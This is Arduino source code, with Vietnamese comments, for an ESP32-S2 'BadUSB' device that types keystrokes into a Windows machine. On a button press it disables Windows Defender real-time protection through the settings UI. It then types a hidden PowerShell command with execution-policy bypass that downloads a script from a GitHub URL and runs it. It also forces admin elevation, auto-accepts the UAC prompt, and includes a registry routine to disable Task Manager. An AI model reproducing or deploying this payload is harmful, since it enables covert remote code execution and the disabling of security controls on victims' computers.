#include <Arduino.h>
#include "USB.h"
#include "USBHIDKeyboard.h"

USBHIDKeyboard Keyboard;

// ============================================
// CẤU HÌNH
// ============================================
const int buttonPin = 0;      // Nút BOOT
const int ledPin = 15;        // LED tích hợp
const int SERIAL_BAUD = 115200;

// Thời gian delay (ms) - ĐÃ TĂNG
const int DELAY_SHORT = 100;      // 30 → 100
const int DELAY_MEDIUM = 250;     // 80 → 250
const int DELAY_LONG = 500;       // 200 → 500
const int DELAY_EXTRA = 800;      // 500 → 800

// URL payload (có thể thay đổi)
const char* PAYLOAD_URL = "https://raw.githubusercontent.com/Sunlaii/ANM-Esp32BadUSB/refs/heads/main/src/main.ps1";

// ============================================
// HÀM TIỆN ÍCH
// ============================================

void pressCombo(uint8_t key1, uint8_t key2) {
    Keyboard.press(key1);
    delay(DELAY_SHORT);
    Keyboard.press(key2);
    delay(DELAY_MEDIUM);
    Keyboard.releaseAll();
    delay(DELAY_LONG);
}

void pressCombo3(uint8_t key1, uint8_t key2, uint8_t key3) {
    Keyboard.press(key1);
    delay(50);        // giữ nguyên 20→50
    Keyboard.press(key2);
    delay(50);        // giữ nguyên 20→50
    Keyboard.press(key3);
    delay(150);       // 100→150
    Keyboard.releaseAll();
    delay(500);       // 300→500
}

void typeText(const char* text) {
    Keyboard.print(text);
    delay(150);       // 100→150
}

void openRun(const char* command) {
    pressCombo(KEY_LEFT_GUI, 'r');
    delay(DELAY_EXTRA);
    typeText(command);
    delay(500);       // 300→500
}

void blinkLED(int times, int duration) {
    for (int i = 0; i < times; i++) {
        digitalWrite(ledPin, HIGH);
        delay(duration);
        digitalWrite(ledPin, LOW);
        delay(duration);
    }
}

// ============================================
// CÁC BƯỚC TẤN CÔNG
// ============================================

void step1_HideWindows() {
    Serial.println("[1/5] Thu nhỏ cửa sổ (Win+D)...");
    delay(1500);          // 1000→1500
    pressCombo(KEY_LEFT_GUI, 'd');
    delay(1500);          // 1000→1500
}

void step2_OpenRun() {
    Serial.println("[2/5] Mở Run (Win+R)...");
    Keyboard.press(KEY_LEFT_GUI);
    delay(100);           // 50→100
    Keyboard.press('r');
    delay(100);           // 50→100
    Keyboard.releaseAll();
    delay(500);           // 200→500
}

void step3_ExecutePowerShell() {
    Serial.println("[3/5] Gọi PowerShell tải payload...");
    Keyboard.print("powershell -w h -NoP -Ep Bypass -Command \"irm ");
    Keyboard.print(PAYLOAD_URL);
    Keyboard.print(" | iex\"");
    delay(1500);          // 1000→1500
}

void step4_ElevateAdmin() {
    Serial.println("[4/5] Nâng quyền Admin (Ctrl+Shift+Enter)...");
    pressCombo3(KEY_LEFT_CTRL, KEY_LEFT_SHIFT, KEY_RETURN);
    delay(1500);          // 800→1500
}

void step5_BypassUAC() {
    Serial.println("[5/5] Vượt qua UAC (Alt+Y)...");
    Keyboard.press(KEY_LEFT_ALT);
    delay(DELAY_SHORT);
    Keyboard.press('y');
    delay(200);           // 100→200
    Keyboard.releaseAll();
    delay(2500);          // 1500→2500
}

void disableTaskManager() {
    // Mở Run
    pressCombo(KEY_LEFT_GUI, 'r');
    delay(1000);          // 600→1000
    
    // Mở PowerShell
    typeText("powershell");
    delay(500);           // 300→500
    
    // Chạy Admin
    pressCombo3(KEY_LEFT_CTRL, KEY_LEFT_SHIFT, KEY_RETURN);
    delay(2500);          // 1500→2500
    
    // Xử lý UAC
    Keyboard.press(KEY_LEFT_ALT);
    delay(DELAY_SHORT);
    Keyboard.press('y');
    delay(200);           // 100→200
    Keyboard.releaseAll();
    delay(3000);          // 2000→3000
    
    // Disable Task Manager
    typeText("New-Item -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Force | Out-Null; ");
    typeText("Set-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name \"DisableTaskMgr\" -Value 1");
    delay(500);           // 300→500
    Keyboard.press(KEY_RETURN);
    delay(100);           // 50→100
    Keyboard.releaseAll();
    delay(2500);          // 1500→2500
    
    // Thoát
    typeText("exit");
    delay(500);           // 200→500
    Keyboard.press(KEY_RETURN);
    delay(100);           // 50→100
    Keyboard.releaseAll();
    delay(1000);          // 500→1000
}

void signalComplete() {
    Serial.println("[✓] HOÀN TẤT! Nhấp nháy CapsLock báo hiệu...");
    for (int i = 0; i < 4; i++) {
        Keyboard.press(KEY_CAPS_LOCK);
        delay(100);       // 50→100
        Keyboard.releaseAll();
        delay(400);       // 250→400
        Keyboard.press(KEY_CAPS_LOCK);
        delay(100);       // 50→100
        Keyboard.releaseAll();
        delay(400);       // 250→400
    }
}

void disableDefender() {
    Serial.println("[BYPASS] Đang vô hiệu hóa Windows Defender...");
    
    // Mở Run
    pressCombo(KEY_LEFT_GUI, 'r');
    delay(1000);          // 800→1000
    
    // Mở Windows Security bằng lệnh
    typeText("ms-settings:windowsdefender");
    delay(500);           // 200→500
    Keyboard.press(KEY_RETURN);
    delay(100);           // 50→100
    Keyboard.releaseAll();
    delay(4000);          // 3000→4000
    
    // Tab đến Virus & threat protection
    Keyboard.press(KEY_TAB);
    delay(100);           // 50→100
    Keyboard.releaseAll();
    delay(300);           // 150→300
    
    Keyboard.press(KEY_RETURN);
    delay(100);           // 50→100
    Keyboard.releaseAll();
    delay(3000);          // 2000→3000
    
    // Tab đến Manage settings
    for(int i = 0; i < 4; i++) {
        Keyboard.press(KEY_TAB);
        delay(100);       // 50→100
        Keyboard.releaseAll();
        delay(300);       // 150→300
    }
    
    Keyboard.press(KEY_RETURN);
    delay(100);           // 50→100
    Keyboard.releaseAll();
    delay(2500);          // 1500→2500
    
    // Tắt Real-time protection
    Keyboard.press(' ');
    delay(100);           // 50→100
    Keyboard.releaseAll();
    delay(3500);          // 2500→3500
    
    // Xử lý UAC
    Keyboard.press(KEY_LEFT_ALT);
    delay(100);           // 50→100
    Keyboard.press('y');
    delay(200);           // 100→200
    Keyboard.releaseAll();
    delay(3000);          // 2000→3000
    
    // Đóng (nhấn Alt+F4 hai lần)
    pressCombo(KEY_LEFT_ALT, KEY_F4);
    delay(1500);          // 800→1500
    pressCombo(KEY_LEFT_ALT, KEY_F4);
    delay(1500);          // 800→1500
    
    Serial.println("[BYPASS] Đã hoàn tất vô hiệu hóa Defender");
}

// ============================================
// SETUP & LOOP
// ============================================

void setup() {
    pinMode(buttonPin, INPUT_PULLUP);
    pinMode(ledPin, OUTPUT);
    digitalWrite(ledPin, LOW);
    
    Serial.begin(SERIAL_BAUD);
    Keyboard.begin();
    USB.begin();
    
    delay(5000);          // 3000→5000
    
    Serial.println("\n======================================");
    Serial.println("   BADUSB ESP32-S2 - READY");
    Serial.println("======================================");
    Serial.println("[LOG] Nhấn nút BOOT để kích hoạt payload\n");
}

void loop() {
    if (digitalRead(buttonPin) == LOW) {
        delay(500);       // 300→500
        digitalWrite(ledPin, HIGH);
        
        Serial.println("\n[ATTACK] BẮT ĐẦU TẤN CÔNG ===========>\n");
        
        step1_HideWindows();
        
        // Gọi hàm disableDefender (bỏ comment để dùng)
        disableDefender();
        
        step2_OpenRun();
        step3_ExecutePowerShell();
        step4_ElevateAdmin();
        step5_BypassUAC();
        
        // disableTaskManager();  // Comment vì đã có trong ps1
        
        signalComplete();
        
        Serial.println("\n[ATTACK] KẾT THÚC ===================>\n");
        Serial.println("[LOG] Có thể rút USB ngay bây giờ");
        
        digitalWrite(ledPin, LOW);
        
        while (digitalRead(buttonPin) == LOW) delay(50);  // 10→50
    }
}